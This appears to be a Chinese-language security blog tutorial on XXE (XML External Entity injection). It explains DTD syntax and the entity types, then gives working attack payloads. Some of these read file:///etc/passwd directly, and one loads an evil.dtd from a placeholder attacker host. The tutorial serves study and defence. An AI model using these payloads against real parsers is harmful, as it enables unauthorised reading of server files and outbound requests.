---
title: xxe
date: 2021-12-24 21:46:28
tags:
      - xxe
categories: xxe
typora-root-url: ..
description: xxe
---

### xxe

xxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在**应用程序解析XML输入时,没有禁止外部实体的加载**,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测...

#### DTD

Document Type Definition 文档类型定义

##### DTD示例

`<!ELEMENT 元素名 类型>`

文件名xxe.dtd

```dtd
<!ELEMENT 班级 (学生+)>
<!ELEMENT 学生 (名字,年龄,介绍)>
<!ELEMENT 名字 (#PCDATA)>
<!ELEMENT 年龄 (#PCDATA)>
<!ELEMENT 介绍 (#PCDATA)>
```

##### PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data）。
PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。

##### CDATA

CDATA 的意思是字符数据（character data）。
CDATA 是不会被解析器解析的文本。

##### XML示例

班级为根元素

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE 班级 SYSTEM "xxe.dtd">
<班级>
	<学生>
        <名字>张三</名字>
        <年龄>19</年龄>
        <介绍>好孩子</介绍>
    </学生>
    <学生>
        <名字>小明</名字>
        <年龄>21</年龄>
        <介绍>学习认真</介绍>
    </学生>
</班级>
```

内部DTD

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE 班级 [
<!ELEMENT 班级 (学生+)>
<!ELEMENT 学生 (名字,年龄,介绍)>
<!ELEMENT 名字 (#PCDATA)>
<!ELEMENT 年龄 (#PCDATA)>
<!ELEMENT 介绍 (#PCDATA)>
]>
<班级>
	<学生>
        <名字>张三</名字>
        <年龄>19</年龄>
        <介绍>好孩子</介绍>
    </学生>
    <学生>
        <名字>小明</名字>
        <年龄>21</年龄>
        <介绍>学习认真</介绍>
    </学生>
</班级>
```



#### 具体操作

引入外部的DTD文档分为两种:

##### 1.`<!DOCTYPE 文档类型名称 SYSTEM  "DTD文档的URL">`

##### 2.`<!DOCTYPE 文档类型名称 PUBLIC "DTD名称" "DTD文件的URL">`

DTD实体

实体≈变量



##### 内部实体

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY xxe "hello">
]>
<neo>&xxe;</neo>
```

会在页面回显hello

##### 外部实体

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY xxe SYSTEM "文档URL">
]>
<neo>&xxe;</neo>
```

##### 参数实体

参数实体只能在DTD文档中定义,DTD中引用

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd">
	%xxe;

]>
<neo>&evil;</neo>
```

#### 攻击方式

##### 直接通过DTD外部实体声明

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<c>&xxe;</c>
```

##### 通过DTD文档引入外部DTD文档,再引入外部实体声明

xml内容

```xml
<?xml version="1.0"?>
<!DOCTYPE neo SYSTEM "dtd文档url">
<c>&xxe;</c>
```

dtd内容

```dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

通过参数实体

先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明

xml内容

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY %d SYSTEM "http://xxx.xxx/evil.dtd">
	%d;
]>
<c>&xxe;</c>
```

dtd文件内容

```dtd
<!ENTITY b SYSTEM "file:///etc/passwd">
```

#### 协议支持

![image-20211225130238479](/images/xxe/image-20211225130238479.png)
